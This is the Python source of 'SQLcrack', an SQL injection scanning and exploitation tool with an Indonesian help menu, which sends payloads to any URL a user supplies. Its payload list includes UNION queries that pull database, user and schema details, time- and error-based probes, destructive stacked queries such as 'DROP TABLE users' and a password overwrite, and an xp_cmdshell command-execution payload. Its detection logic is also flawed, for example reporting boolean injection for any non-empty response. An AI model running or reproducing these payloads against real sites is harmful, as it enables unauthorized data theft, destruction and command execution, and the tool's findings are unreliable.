#!/usr/bin/env python3
# SQLcrack v1.2.0 - SQL Injection Vulnerability Scanner
# Advanced DBMS Fingerprinting & Exploitation Framework

import sys
import argparse
import requests
import urllib.parse
import json
import time
import re
import os
from datetime import datetime
from urllib.parse import urljoin, parse_qs, urlparse

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class SQLcrack:
    VERSION = "1.2.0"
    LAST_UPDATE = "2026-10-11"
    NEXT_UPDATE = "2026-11-15"

    PAYLOADS = {
        'union': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            "' UNION SELECT database(),user(),version(),NULL--",
            "' UNION SELECT table_name,column_name,NULL,NULL FROM information_schema.columns--"
        ],
        'time-based': [
            "' AND SLEEP(5)--",
            "' AND BENCHMARK(10000000,MD5('x'))--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND 1=DBMS_LOCK.SLEEP(5)--"
        ],
        'error-based': [
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version)),0x7e FROM information_schema.tables GROUP BY 1)a)--",
            "' AND 1=CAST((SELECT @@version) AS INT)--"
        ],
        'stacked': [
            "'; DROP TABLE users--",
            "'; INSERT INTO users VALUES('admin','pass')--",
            "'; UPDATE users SET password='hacked'--",
            "'; EXEC xp_cmdshell('whoami')--"
        ],
        'boolean': [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--"
        ]
    }

    DBMS_FINGERPRINTS = {
        'MySQL': [
            'SELECT @@version',
            'UNION SELECT version()',
            '@@version_comment',
            'MySQL'
        ],
        'PostgreSQL': [
            'SELECT version()',
            'PostgreSQL',
            'UNION SELECT version()',
            'pg_database'
        ],
        'MSSQL': [
            'SELECT @@version',
            'WAITFOR DELAY',
            'xp_cmdshell',
            'Microsoft SQL Server'
        ],
        'Oracle': [
            'SELECT * FROM v$version',
            'DBMS_LOCK.SLEEP',
            'rownum',
            'Oracle Database'
        ],
        'SQLite': [
            'SQLITE_VERSION()',
            'sqlite_master',
            'sqlite_temp_master'
        ]
    }

    def __init__(self, args):
        self.args = args
        self.session = requests.Session()
        self.session.timeout = 10
        self.results = []
        self.vulnerable = False
        self.dbms_detected = None
        self.session_file = os.path.expanduser('~/.sqlcrack_session')

        if args.cookie:
            self.session.headers.update({'Cookie': args.cookie})

    def banner(self):
        banner_text = f"""
{Colors.BOLD}{Colors.RED}
  ███████╗ ██████╗ ██╗     ██████╗ ██████╗ █████╗  ██████╗ ██╗  ██╗
  ██╔════╝██╔═══██╗██║     ██╔════╝██╔════╝██╔══██╗██╔════╝ ██║ ██╔╝
  ███████╗██║   ██║██║     ██║     ██║     ███████║██║      █████╔╝
  ╚════██║██║   ██║██║     ██║     ██║     ██╔══██║██║      ██╔═██╗
  ███████║╚██████╔╝███████╗╚██████╗╚██████╗██║  ██║╚██████╗██║  ██╗
  ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{Colors.ENDC}
{Colors.CYAN}                    v{self.VERSION} - SQL Injection Scanner{Colors.ENDC}
{Colors.YELLOW}              Advanced DBMS Fingerprinting & Exploitation{Colors.ENDC}
"""
        print(banner_text)

    def print_help(self):
        help_text = f"""
{Colors.BOLD}{Colors.CYAN}SQLcrack v{self.VERSION} - Help Menu{Colors.ENDC}

{Colors.BOLD}USAGE:{Colors.ENDC}
    python3 sqlcrack.py -f <URL> [OPTIONS]

{Colors.BOLD}PARAMETER UTAMA:{Colors.ENDC}
    -f, --file URL              Target URL untuk pengujian (WAJIB)
    -r, --request FILE          Baca request HTTP dari file
    -v, --verbose LEVEL         Tingkat detail output: 0-3 (default: 1)

{Colors.BOLD}KONFIGURASI PAYLOAD:{Colors.ENDC}
    --data DATA                 Data POST yang dikirim
    --method METHOD             Metode HTTP: GET/POST/PUT/DELETE (default: GET)
    --headers HEADERS           Custom headers (JSON format)
    --cookie COOKIE             Cookie untuk autentikasi

{Colors.BOLD}OPSI PENGUJIAN:{Colors.ENDC}
    --level LEVEL               Level pengujian: 1-5
                                1=Dasar, 5=Ekstrem (default: 1)
    --risk RISK                 Tingkat risiko: 1-3
                                1=Aman, 2=Sedang, 3=Berbahaya (default: 1)
    --technique TECH            Teknik pengujian terpisah koma:
                                union,time-based,error-based,stacked,boolean
    --fingerprint               Identifikasi DBMS target

{Colors.BOLD}OPTIMASI:{Colors.ENDC}
    --batch                     Gunakan jawaban default otomatis
    --flush-session             Hapus data sesi yang tersimpan

{Colors.BOLD}INFORMASI:{Colors.ENDC}
    -a, --help                  Tampilkan bantuan detail ini
    --version                   Tampilkan versi dan info update

{Colors.BOLD}CONTOH PENGGUNAAN:{Colors.ENDC}

    # Scan dasar target URL
    python3 sqlcrack.py -f "http://target.com/page.php?id=1"

    # Scan POST dengan data
    python3 sqlcrack.py -f "http://target.com/login" \\
        --method POST --data "user=admin&pass=123"

    # Fingerprinting DBMS
    python3 sqlcrack.py -f "http://target.com/search?q=test" \\
        --fingerprint --level 3

    # Custom teknik dengan cookie
    python3 sqlcrack.py -f "http://target.com/api" \\
        --technique union,time-based \\
        --cookie "session=abc123" --verbose 2

    # Baca dari file request
    python3 sqlcrack.py -r request.txt --batch

{Colors.BOLD}DESKRIPSI LEVEL:{Colors.ENDC}
    Level 1: Payload dasar (cepat, akurat untuk target sederhana)
    Level 2: Payload menengah (modifikasi karakter khusus)
    Level 3: Payload lanjutan (bypass WAF/enkripsi)
    Level 4: Payload ekstrem (fuzzing, encoding berlapis)
    Level 5: Payload maksimal (semua variasi, lambat)

{Colors.BOLD}DESKRIPSI RISK:{Colors.ENDC}
    Risk 1: Payload read-only (SELECT queries)
    Risk 2: Payload dengan modifikasi (UPDATE, INSERT)
    Risk 3: Payload destruktif (DROP, DELETE, command execution)

{Colors.BOLD}TEKNIK PENGUJIAN:{Colors.ENDC}
    union       → UNION-based SQL Injection
    time-based  → Time-based Blind SQL Injection
    error-based → Error-based SQL Injection
    stacked     → Stacked Queries Injection
    boolean     → Boolean-based Blind SQL Injection

{Colors.BOLD}DISCLAIMER:{Colors.ENDC}
    Tools ini hanya untuk audit keamanan website Anda sendiri.
    Penggunaan pada sistem tanpa izin = ILEGAL.
    User bertanggung jawab penuh atas penggunaan tools ini.

{Colors.BOLD}DOKUMENTASI LENGKAP:{Colors.ENDC}
    https://github.com/AZzykJa/sqlcrack

{Colors.ENDC}"""
        print(help_text)

    def show_version(self):
        version_text = f"""
{Colors.BOLD}{Colors.CYAN}SQLcrack Version Information{Colors.ENDC}

Current Version  : {Colors.GREEN}v{self.VERSION}{Colors.ENDC}
Release Date     : {self.LAST_UPDATE}
Next Update      : {self.NEXT_UPDATE}
Status           : {Colors.GREEN}Stable{Colors.ENDC}

{Colors.YELLOW}[!] Update Recommendation:{Colors.ENDC}
    - Check for updates setiap bulan untuk fitur terbaru
    - Run: python3 sqlcrack.py --version untuk cek status
    - GitHub: https://github.com/AZzykJa/sqlcrack

{Colors.ENDC}"""
        print(version_text)

    def log(self, level, message):
        timestamp = datetime.now().strftime("%H:%M:%S")

        if level == "info":
            prefix = f"{Colors.BLUE}[*]{Colors.ENDC}"
        elif level == "success":
            prefix = f"{Colors.GREEN}[+]{Colors.ENDC}"
        elif level == "error":
            prefix = f"{Colors.RED}[-]{Colors.ENDC}"
        elif level == "warning":
            prefix = f"{Colors.YELLOW}[!]{Colors.ENDC}"
        elif level == "debug":
            if self.args.verbose < 2:
                return
            prefix = f"{Colors.CYAN}[D]{Colors.ENDC}"
        else:
            prefix = "[*]"

        print(f"{prefix} [{timestamp}] {message}")

    def test_connection(self):
        self.log("info", f"Testing connection to {self.args.file}...")
        try:
            response = self.session.request(
                method=self.args.method.upper(),
                url=self.args.file,
                data=self.args.data,
                timeout=5
            )
            self.log("success", f"Connection OK - Status: {response.status_code}")
            return True
        except Exception as e:
            self.log("error", f"Connection failed: {str(e)}")
            return False

    def fingerprint_dbms(self):
        self.log("info", "Starting DBMS fingerprinting...")

        for dbms, signatures in self.DBMS_FINGERPRINTS.items():
            for signature in signatures:
                payload = f"' OR 1=1 -- {signature}"

                try:
                    response = self.session.request(
                        method=self.args.method.upper(),
                        url=self.args.file,
                        data=self.args.data if self.args.data else None,
                        params={'id': payload} if self.args.method.upper() == 'GET' else None,
                        timeout=5
                    )

                    if any(sig.lower() in response.text.lower() for sig in signatures):
                        self.log("success", f"DBMS Detected: {Colors.BOLD}{dbms}{Colors.ENDC}")
                        self.dbms_detected = dbms
                        return dbms
                except:
                    continue

        self.log("warning", "Could not fingerprint DBMS - proceeding with generic payloads")
        return None

    def test_injection(self, payload, technique):
        try:
            if self.args.method.upper() == 'POST':
                if self.args.data:
                    modified_data = self.args.data.replace('=', f"={payload}&").rstrip('&')
                    response = self.session.post(
                        self.args.file,
                        data=modified_data,
                        timeout=self.session.timeout
                    )
                else:
                    response = self.session.post(
                        self.args.file,
                        data={'param': payload},
                        timeout=self.session.timeout
                    )
            else:
                parsed = urlparse(self.args.file)
                params = parse_qs(parsed.query)
                if not params:
                    params = {'id': payload}
                else:
                    for key in params:
                        params[key] = [payload]

                response = self.session.get(
                    self.args.file.split('?')[0],
                    params=params,
                    timeout=self.session.timeout
                )

            return response
        except requests.Timeout:
            if technique == 'time-based':
                return True  # Time-based success
            return None
        except Exception as e:
            self.log("debug", f"Error testing payload: {str(e)}")
            return None

    def analyze_response(self, response, original_response, technique):
        if response is None:
            return False

        if response is True:
            return True

        if not isinstance(response, requests.Response):
            return False

        if technique == 'union':
            if len(response.text) != len(original_response.text):
                return True
            if 'NULL' in response.text or 'database()' in response.text:
                return True

        elif technique == 'error-based':
            error_patterns = [
                r"SQL syntax",
                r"mysql_fetch",
                r"Warning.*mysql",
                r"ORA-\d+",
                r"PostgreSQL",
                r"SQL Server",
            ]
            for pattern in error_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return True

        elif technique == 'boolean':
            return len(response.text) > 0

        return False

    def run_scan(self):
        self.banner()

        if not self.test_connection():
            return

        techniques = self.args.technique.split(',') if self.args.technique else ['union', 'time-based', 'error-based', 'boolean']

        # Get original response
        try:
            original = self.session.request(
                method=self.args.method.upper(),
                url=self.args.file,
                data=self.args.data,
                timeout=5
            )
        except:
            original = None

        if self.args.fingerprint:
            self.fingerprint_dbms()

        self.log("info", f"Level: {self.args.level} | Risk: {self.args.risk}")
        self.log("info", f"Testing techniques: {', '.join(techniques)}")
        self.log("info", "Starting vulnerability scan...\n")

        for technique in techniques:
            if technique not in self.PAYLOADS:
                continue

            self.log("info", f"Testing {Colors.BOLD}{technique.upper()}{Colors.ENDC} technique...")

            for i, payload in enumerate(self.PAYLOADS[technique], 1):
                if self.args.level < 3 and i > 2:
                    continue
                if self.args.level < 5 and i > 5:
                    continue

                self.log("debug", f"Payload: {payload}")

                response = self.test_injection(payload, technique)

                if self.analyze_response(response, original, technique):
                    self.log("success", f"{Colors.BOLD}VULNERABLE!{Colors.ENDC} Technique: {technique}")
                    self.log("success", f"Payload: {Colors.YELLOW}{payload}{Colors.ENDC}")

                    self.vulnerable = True
                    self.results.append({
                        'technique': technique,
                        'payload': payload,
                        'timestamp': datetime.now().isoformat()
                    })
                    break

            time.sleep(0.5)  # Rate limiting

        self.print_results()

    def print_results(self):
        print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}SCAN RESULTS{Colors.ENDC}")
        print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}\n")

        if self.vulnerable:
            print(f"{Colors.RED}{Colors.BOLD}[!] TARGET VULNERABLE TO SQL INJECTION{Colors.ENDC}\n")
            print(f"{Colors.BOLD}Vulnerabilities Found:{Colors.ENDC}")
            for i, result in enumerate(self.results, 1):
                print(f"\n  [{i}] Technique: {Colors.YELLOW}{result['technique'].upper()}{Colors.ENDC}")
                print(f"      Payload: {result['payload']}")
                print(f"      Time: {result['timestamp']}")

            if self.dbms_detected:
                print(f"\n{Colors.BOLD}DBMS Detected:{Colors.ENDC} {Colors.GREEN}{self.dbms_detected}{Colors.ENDC}")
        else:
            print(f"{Colors.GREEN}{Colors.BOLD}[+] No SQL Injection Vulnerabilities Detected{Colors.ENDC}")

        print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}\n")

    def save_session(self):
        session_data = {
            'target': self.args.file,
            'timestamp': datetime.now().isoformat(),
            'vulnerable': self.vulnerable,
            'results': self.results,
            'dbms': self.dbms_detected
        }

        try:
            with open(self.session_file, 'w') as f:
                json.dump(session_data, f, indent=2)
            self.log("debug", f"Session saved to {self.session_file}")
        except Exception as e:
            self.log("warning", f"Could not save session: {str(e)}")

    def flush_session(self):
        try:
            if os.path.exists(self.session_file):
                os.remove(self.session_file)
                self.log("success", "Session data flushed")
            else:
                self.log("warning", "No session data found")
        except Exception as e:
            self.log("error", f"Could not flush session: {str(e)}")

def main():
    parser = argparse.ArgumentParser(
        description='SQLcrack v1.2.0 - SQL Injection Vulnerability Scanner',
        add_help=False
    )

    parser.add_argument('-a', '--help', action='store_true', help='Show detailed help')
    parser.add_argument('--version', action='store_true', help='Show version information')
    parser.add_argument('-f', '--file', type=str, help='Target URL')
    parser.add_argument('-r', '--request', type=str, help='Read HTTP request from file')
    parser.add_argument('-v', '--verbose', type=int, default=1, choices=[0, 1, 2, 3], help='Verbosity level')
    parser.add_argument('--data', type=str, help='POST data')
    parser.add_argument('--method', type=str, default='GET', choices=['GET', 'POST', 'PUT', 'DELETE'], help='HTTP method')
    parser.add_argument('--headers', type=str, help='Custom headers (JSON format)')
    parser.add_argument('--cookie', type=str, help='Cookie for authentication')
    parser.add_argument('--batch', action='store_true', help='Use default answers automatically')
    parser.add_argument('--level', type=int, default=1, choices=[1, 2, 3, 4, 5], help='Test level')
    parser.add_argument('--risk', type=int, default=1, choices=[1, 2, 3], help='Risk level')
    parser.add_argument('--technique', type=str, help='Testing techniques (comma-separated)')
    parser.add_argument('--fingerprint', action='store_true', help='Fingerprint DBMS')
    parser.add_argument('--flush-session', action='store_true', help='Flush session data')

    args = parser.parse_args()

    if args.help or (len(sys.argv) == 1):
        sqlcrack = SQLcrack(args)
        sqlcrack.print_help()
        return

    if args.version:
        sqlcrack = SQLcrack(args)
        sqlcrack.show_version()
        return

    if args.flush_session:
        sqlcrack = SQLcrack(args)
        sqlcrack.flush_session()
        return

    if not args.file and not args.request:
        print(f"{Colors.RED}[ERROR] Target URL required (-f) or request file (-r){Colors.ENDC}")
        print(f"Use '-a' or '--help' for full documentation\n")
        return

    sqlcrack = SQLcrack(args)

    try:
        sqlcrack.run_scan()
        sqlcrack.save_session()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Scan interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.RED}[ERROR] {str(e)}{Colors.ENDC}")

if __name__ == '__main__':
    main()
